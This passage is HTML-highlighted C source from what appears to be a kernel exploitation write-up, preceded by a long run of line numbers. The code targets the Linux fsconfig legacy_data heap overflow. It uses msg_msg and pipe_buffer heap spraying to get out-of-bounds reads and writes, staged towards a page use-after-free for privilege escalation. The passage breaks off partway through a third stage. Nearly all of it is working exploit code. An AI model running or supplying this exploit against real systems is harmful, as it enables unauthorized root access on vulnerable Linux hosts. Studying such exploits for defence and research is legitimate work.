class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief make an out-of-bound write to the next object in kmalloc-4k,</span><br><span class="hljs-comment"> * note that the buf before will always be appended to a &quot;,=&quot;,</span><br><span class="hljs-comment"> * for a ctx-legacy_data with 4095 bytes&#x27; data, the &#x27;,&#x27; will be the last byte,</span><br><span class="hljs-comment"> * and the &#x27;=&#x27; will always be on the first byte of the object nearby</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * @return int - the fd for filesystem context</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">prepare_oob_write</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br><br>    <span class="hljs-comment">/* get a filesystem context */</span><br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to fsopen()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment">     * so that the (0x1000 - 2 - size) overflow</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> fs_fd;    <br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SPRAY_NR 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SZ    (0x1000+0x20-sizeof(struct msg_msg)-sizeof(struct msg_msgseg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OOB_READ_SZ    (0x2000-sizeof(struct msg_msg)-sizeof(struct msg_msgseg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TYPE 0x41414141</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_SPRAY_NR 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NR MSG_SPRAY_NR</span><br><br><span class="hljs-type">int</span> msqid[MSG_SPRAY_NR];<br><span class="hljs-type">int</span> seq_fd[SEQ_SPRAY_NR];<br><span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> fs_fd, victim_qidx = <span class="hljs-number">-1</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief We don&#x27;t need to leak anything here, we just need to occupy a 4k obj.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">occupy_4k_obj_by_msg</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>], ktext_leak = <span class="hljs-number">-1</span>;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;Stage I - corrupting msg_msg to leak kernel info and occupy a 4k obj&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating pipe...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at creating %d pipe.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to create pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating msg_queue and msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (MSG_SPRAY_NR - <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = get_msg_queue()) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at allocating %d queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to create msg_queue!&quot;</span>);<br>        &#125;<br><br>        buf[<span class="hljs-number">0</span>] = i;<br>        buf[MSG_SZ / <span class="hljs-number">8</span>] = i;<br>        <span class="hljs-keyword">if</span> (write_msg(msqid[i], buf, MSG_SZ, MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at writing %d queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to allocate msg_msg!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating fs-&gt;legacy_data...&quot;</span>);<br>    fs_fd = prepare_oob_write();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating msg_queue and msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (MSG_SPRAY_NR - <span class="hljs-number">8</span>); i &lt; MSG_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = get_msg_queue()) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at allocating %d queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to create msg_queue!&quot;</span>);<br>        &#125;<br><br>        buf[<span class="hljs-number">0</span>] = i;<br>        buf[MSG_SZ / <span class="hljs-number">8</span>] = i;<br>        <span class="hljs-keyword">if</span> (write_msg(msqid[i], buf, MSG_SZ, MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at writing %d queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to allocate msg_msg!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    puts(&quot;\n[*] Spray seq_operations...&quot;);</span><br><span class="hljs-comment">    for (int i = 0; i &lt; SEQ_SPRAY_NR; i++) &#123;</span><br><span class="hljs-comment">        if ((seq_fd[i] = open(&quot;/proc/self/stat&quot;, O_RDONLY)) &lt; 0) &#123;</span><br><span class="hljs-comment">            printf(&quot;[x] Failed at creating %d seq_file.\n&quot;, i);</span><br><span class="hljs-comment">            err_exit(&quot;FAILED to create seq_file!&quot;);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;*/</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fsconfig() to set the size to the &amp;msg_msg-&gt;m_ts...&quot;</span>);<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;1919810ARTTNBA114514&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fsconfig() to overwrite the msg_msg-&gt;m_ts...&quot;</span>);<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-string">&quot;\xc8\x1f&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Tring to make an oob read...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_SPRAY_NR; i++) &#123;<br>        <span class="hljs-type">ssize_t</span> read_size;<br><br>        read_size = peek_msg(msqid[i], buf, OOB_READ_SZ, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (read_size &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at reading %d msg_queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to read msg_msg!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (read_size &gt; MSG_SZ) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found victim msg_msg at \033[0m&quot;</span><br>                   <span class="hljs-string">&quot;%d\033[32m\033[1m msg_queue!\033[0m\n&quot;</span>, i);<br>            victim_qidx = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qidx == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to overwrite the header of msg_msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    for (int i = MSG_SZ / 8; i &lt; (OOB_READ_SZ / 8); i++) &#123;</span><br><span class="hljs-comment">        if (buf[i] &gt; 0xffffffff81000000 &amp;&amp; ((buf[i] &amp; 0xfff) == 0x4d0)) &#123;</span><br><span class="hljs-comment">            printf(&quot;[*] Leak kernel text addr: %lx\n&quot;, buf[i]);</span><br><span class="hljs-comment">            ktext_leak = buf[i];</span><br><span class="hljs-comment">            break;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    if (ktext_leak == -1) &#123;</span><br><span class="hljs-comment">        err_exit(&quot;FAILED to leak kernel text address!&quot;);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    kernel_offset = ktext_leak - 0xffffffff813834d0;</span><br><span class="hljs-comment">    kernel_base += kernel_offset;</span><br><span class="hljs-comment">    printf(&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;, kernel_base);</span><br><span class="hljs-comment">    printf(&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;, kernel_offset);</span><br><span class="hljs-comment">    */</span><br>&#125;<br><br><span class="hljs-comment">/* for pipe escalation */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SND_PIPE_BUF_SZ 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRD_PIPE_BUF_SZ 192</span><br><br><span class="hljs-type">int</span> orig_pid, victim_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> snd_orig_pid = <span class="hljs-number">-1</span>, snd_vicitm_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> self_2nd_pipe_pid = <span class="hljs-number">-1</span>, self_3rd_pipe_pid = <span class="hljs-number">-1</span>, self_4th_pipe_pid = <span class="hljs-number">-1</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">info_pipe_buf</span>;</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">corrupting_first_level_pipe_for_page_uaf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x8000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>        <span class="hljs-string">&quot;Stage II - corrupting pipe_buffer to make two pipes point to same page&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating 4k pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (PIPE_SPRAY_NR - <span class="hljs-number">1</span>); i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (read_msg(msqid[i], buf, MSG_SZ, MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at reading %d msg_queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to release msg_msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">64</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at extending %d pipe_buffer.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to extend pipe_buffer!&quot;</span>);<br>        &#125;<br><br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);  <span class="hljs-comment">/* prevent pipe_release() */</span><br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Overwriting pipe_buffer-&gt;page...&quot;</span>);<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;ar&quot;</span>, <span class="hljs-string">&quot;tt&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ((<span class="hljs-number">0x1000</span> - <span class="hljs-number">8</span> * <span class="hljs-number">4</span>) / <span class="hljs-number">16</span>); i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;ratbant&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking for pipe&#x27;s corruption...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (PIPE_SPRAY_NR - <span class="hljs-number">1</span>); i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(a3_str, <span class="hljs-string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i) &#123;<br>            orig_pid = i;<br>            victim_pid = nr;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully corrupt pipe_buffer! &quot;</span><br>           <span class="hljs-string">&quot;orig_pid: \033[0m%d, \033[32m\033[1mvictim pipe: \033[0m%d\n&quot;</span>,<br>           orig_pid, victim_pid);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">corrupting_second_level_pipe_for_pipe_uaf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>], 